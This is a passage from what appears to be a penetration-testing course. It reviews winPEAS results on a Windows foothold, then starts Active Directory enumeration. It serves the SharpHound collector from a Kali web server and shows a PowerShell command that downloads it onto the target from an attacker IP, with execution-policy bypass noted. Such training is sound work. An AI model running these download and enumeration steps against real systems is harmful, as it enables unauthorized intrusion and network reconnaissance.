Reviewing the rest of the winPEAS results, we don't find any actionable information to attempt a potential privilege escalation attack. However, we should remind ourselves that we are in a simulated penetration test and not in a CTF lab. Therefore, it is not necessary to ensure administrative privileges on every machine.

> While we skipped over the winPEAS results, we should examine the results thoroughly as we would in a real penetration test. After the local enumeration of the system, we should have obtained key pieces of information, which we listed in the Situational awareness section of the Windows Privilege Escalation Module.

Since we haven't identified a privilege escalation vector via winPEAS and there is nothing actionable on the system, such as a Password Manager, let's start enumerating the AD environment and its objects.

We learned several techniques in course to perform this kind of enumeration. For this Module, we used BloodHound with the SharpHound.ps1 collector, which we discussed in the Active Directory Introduction and Enumeration Module.

First, we copy the PowerShell collector to /home/kali/beyond in a new terminal to serve it via the Python3 web server on port 8000.

```
kali@kali:~$beyond cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
Listing 912 - Copying SharpHound collector to the beyond directory
```

Since our Python3 web server is running on port 8000, we can download the PowerShell script on the target and import it in a newly spawned PowerShell session with the ExecutionPolicy to Bypass.

```
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
```
